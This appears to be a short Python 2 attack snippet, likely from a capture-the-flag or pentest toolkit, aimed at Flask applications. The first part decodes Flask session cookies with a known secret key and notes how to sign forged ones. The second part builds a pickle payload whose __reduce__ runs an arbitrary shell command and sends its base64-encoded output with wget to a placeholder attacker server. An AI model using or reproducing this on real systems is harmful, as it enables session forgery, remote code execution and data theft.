import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

# get the contents of a flask session cookie given the server secret key
def decode_flask_cookie(secret_key, cookie):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1 # could also be another form of encryption (sha256, sha512)
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie) # s.dumps({<cookie-data>}) for signing new cookie

secret_key = "<secret-key>"
session_cookie = "<session-cookie>"
print decode_flask_cookie(secret_key, session_cookie)


# create a payload for command execution during pickle de-serialization
import pickle
class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen, ('<command> | base64 | xargs wget <attack-server> --user-agent',0, None, None, None, None, None, None, True))
d = {}
d['p'] = Payload()
print pickle.dumps(d).encode('base64')
